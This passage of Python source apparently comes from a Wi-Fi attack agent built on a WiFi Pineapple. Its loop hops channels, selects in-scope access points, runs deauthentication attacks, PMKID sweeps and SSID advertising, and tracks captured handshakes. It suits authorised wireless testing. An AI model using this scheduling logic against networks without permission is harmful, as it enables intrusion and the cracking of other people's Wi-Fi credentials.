        if (self.pool.running and not stale and not overdue
                and self.epoch.number % every):
            return
        self._pool_checked = time.monotonic()
        if not self.pool.running and not stale and self.pool.holding_off():
            return
        wanted = pool_mod.wanted_ssids(self.pineap.stations(),
                                       self.seen_points, self.scope)
        if self.pool.running:
            if not wanted:
                logging.info('nothing left in scope to advertise')
                self.pool.stop()
            else:
                self.pool.refresh(wanted)
            return
        if not wanted:
            return
        self.screen.set_status(voice.on_pool())
        radios = [i for i in ([self.plan.capture, self.pmkid.iface]
                              + self.plan.recons) if i]
        self.pool.start(wanted, radios=radios, channel=self.targeting.pool_channel(),
                        should_stop=self.should_stop)
        if not self.pool.running and self.pool.reason:
            logging.debug('SSID pool stayed off: %s', self.pool.reason)
        self.screen.on_normal()

    def hunt_pmkid(self):
        if self.pmkid.iface or not self.settings.get('single_pmkid'):
            return
        if not self.pmkid.available or self.should_stop():
            return
        if not self.wait_while_paused():
            return
        if not self.pmkid_allowed():
            logging.debug('skipping the PMKID sweep (disk %s)', self.space)
            return
        every, seconds = self.targeting.sweep_plan()
        if self.epoch.number % every:
            return
        targets = None
        if self.scope.skip_captured or self.scope.restricted:
            wanted = self.scope.pmkid_targets(self.access_points) or set()
            if not wanted:
                return
            targets = self.targeting.pmkid_order(wanted)
        channels = self.targeting.tunable(self.targeting.hot_channels(), self.plan.capture)
        if self.settings.channels and not channels:
            logging.info('every in-scope AP is outside the channel filter, '
                         'skipping the PMKID sweep')
            return
        self.sync_pmkid_tuning()
        self.screen.set_status(voice.on_pmkid())
        began = self.mark()
        swept = self.pmkid.sweep(self.pineap, targets, seconds, channels,
                                 self.interrupted)
        spent = self.since(began)
        if not swept:
            self.screen.on_normal()
            return
        self.stats.swept()
        if channels:
            share = spent / len(channels)
            for channel, band in channels:
                self.stats.spent(channel, share, band)
        if not self.plan.recons:
            self.mobility.rebaseline()
        self.screen.on_normal()

    def run_epoch(self):
        if not self.wait_while_paused():
            return
        self.scope.reset_interactions()
        self.check_radios()
        self.recon()
        if self.should_stop():
            return
        aps = self.refresh_targets()
        if not self.indexed.is_set():
            self.next_epoch()
            return
        min_rssi = self.targeting.rssi_floor(aps)
        dwell_time = self.settings.tune('dwell_time')
        only = self.settings.channels or None

        attackable = [ap for ap in aps
                      if ap.get('rssi', UNHEARD) >= min_rssi
                      and (not only or ap.get('channel') in only)
                      and self.scope.targetable(ap)
                      and self.targeting.still_there(ap)]
        self.report_idle(aps, attackable)
        attackable = self.targeting.focus_bands(attackable)

        base = self.mobility.scale('dwell_scale', self.settings.tune('reconnect_dwell'))
        per_ap = self.mobility.scale('dwell_scale',
                                     self.settings.tune('reconnect_dwell_per_ap'))
        cap = self.settings.tune('max_reconnect_dwell')

        plan = self.targeting.channel_plan(attackable, only)
        crowd = self.targeting.targets_room(len(plan))
        visited = 0
        for (channel, band), targets in plan:
            if self.should_stop():
                break
            if self.epoch.stale:
                logging.info('too many targets vanished, going back to recon')
                break
            self.hop(channel, band)
            visited += 1
            actionable = [ap for ap in targets if self.targeting.deauth_worth_it(ap)]
            if len(actionable) > crowd:
                logging.debug('%d attackable of %d on ch %s, working the best %d',
                              len(actionable), len(targets), channel, crowd)
                actionable = actionable[:crowd]
            live = max([ap.get('channel_clients', 0) for ap in targets] or [0])
            live += sum(len(ap.get('clients') or []) for ap in actionable)
            live += sum(len(ap.get('kin') or []) for ap in actionable)
            push = max([self.targeting.effort(ap) for ap in actionable] or [0])
            if not actionable:
                self.dwell(channel, max(1.0, dwell_time
                                        * self.targeting.channel_bias(channel, band)),
                           band)
                continue
            faint = not any(self.targeting.hearable(ap) for ap in actionable)
            stretch = self.settings.tune('weak_dwell_bonus') if faint else 1.0
            if self.env.crowded_channel(channel, band):
                stretch *= self.settings.tune('busy_dwell_bonus')
            room = cap
            earns = self.targeting.channel_bias(channel, band)
            window = min(room, (base + per_ap * len(actionable)) * stretch
                         * earns) if live else max(1.0, dwell_time * earns)
            budget = sum(self.targeting.attack_seconds(ap, push) for ap in actionable)
            self.hold(channel, budget + window + 5, band)
            hits = 0
            began = self.mark()
            for ap in actionable:
                if self.should_stop():
                    break
                if not self.scope.targetable(ap):
                    continue
                if self.attack(ap):
                    hits += 1
            self.stats.spent(channel, self.since(began), band)
            if hits and live and not self.should_stop():
                self.screen.set_status(voice.on_listening())
                listen = (base + per_ap * hits) * stretch * earns
                if push:
                    listen *= 1 + self.settings.tune('effort_dwell_bonus') * push
                self.dwell(channel, min(room, listen), band)
            elif not self.should_stop():
                self.dwell(channel, max(1.0, dwell_time * earns), band)

        self.targeting.advance_channel_turn(visited)
        if self.should_stop():
            return
        self.run_pool()
        if self.should_stop():
            return
        self.hunt_pmkid()
        if self.should_stop():
            return
        self.next_epoch()

    def report_idle(self, aps, attackable):
        if attackable:
            self.idle_reason = None
            return
        only = self.settings.channels
        min_rssi = self.targeting.rssi_floor(aps)
        seen = self.seen_points
        in_scope = [ap for ap in aps if self.scope.targetable(ap)]
        if not self.pineap.responding:
            self.idle_reason = 'radio not answering'
        elif not seen:
            self.idle_reason = 'nothing in range'
        elif not aps:
            self.idle_reason = 'out of scope'
        elif self.scope.skip_captured and all(self.scope.captured(ap) for ap in aps):
            self.idle_reason = 'captured'
        elif not in_scope:
            self.idle_reason = 'out of scope'
        elif only and not any(ap.get('channel') in only for ap in in_scope):
            self.idle_reason = 'channels filtered'
        elif not any(ap.get('rssi', -100) >= min_rssi for ap in in_scope):
            self.idle_reason = 'too far'
        elif not any(self.targeting.still_there(ap) for ap in in_scope):
            self.idle_reason = 'moved on'
        else:
            self.idle_reason = 'out of scope'
        self.screen.on_idle(self.idle_reason)

    def next_epoch(self):
        captured = self.captures.bssids
        busy = {ap.get('mac', '').lower() for ap in self.access_points
                if ap.get('clients') or ap.get('busy', 0) >= MIN_ACTIVITY}
        scored = set()
        heard = {ap.get('mac', '').lower(): ap.get('rssi', UNHEARD)
                 for ap in self.access_points if ap.get('mac')}
        due, waiting = self.history.settle(captured, OUTCOME_DELAY)
        self.history.set_pending(waiting)
        for mac, had, aimed in due:
            hit = mac in captured and not had
            scored.add(mac)
            self.history.note_outcome(mac, hit)
            if hit or aimed:
                self.note_approach(mac, hit)
            if hit:
                self.history.rest(mac)
            else:
                self.history.tire(mac, heard.get(mac))
        attacked = self.history.take_attacked()
        self.history.forgive(scored | attacked, busy, heard,
                             self.mobility.moving)
        self.history.trim()
        snapshot = self.epoch.advance()
        self._total_deauths += snapshot['deauths']
        self._total_assocs += snapshot['associations']
        self.mood.settle(snapshot)
        if self.mood.current in (epoch_mod.SAD, epoch_mod.BORED,
                                epoch_mod.LONELY, epoch_mod.ANGRY):
            self._cue('on_sad')
        else:
            self._cue('on_idle')

    def _save_session(self):
        try:
            tmp = config.SESSION_FILE + '.tmp'
            with open(tmp, 'w') as f:
                json.dump({
                    'duration': system.secs_to_hhmmss(time.monotonic() - self._began),
                    'epochs': self.epoch.number,
                    'networks_captured': self.session_handshakes,
                    'networks_known': self.captures.network_count(),
                    'deauths': self._total_deauths + self.epoch.num_deauths,
                    'associations': self._total_assocs + self.epoch.num_assocs,
                    'sweeps': self.stats.sweeps,
                    'recon_seconds_saved': int(self._recon_saved),
                }, f)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp, config.SESSION_FILE)
        except Exception as e:
            logging.debug('could not save session: %s', e)
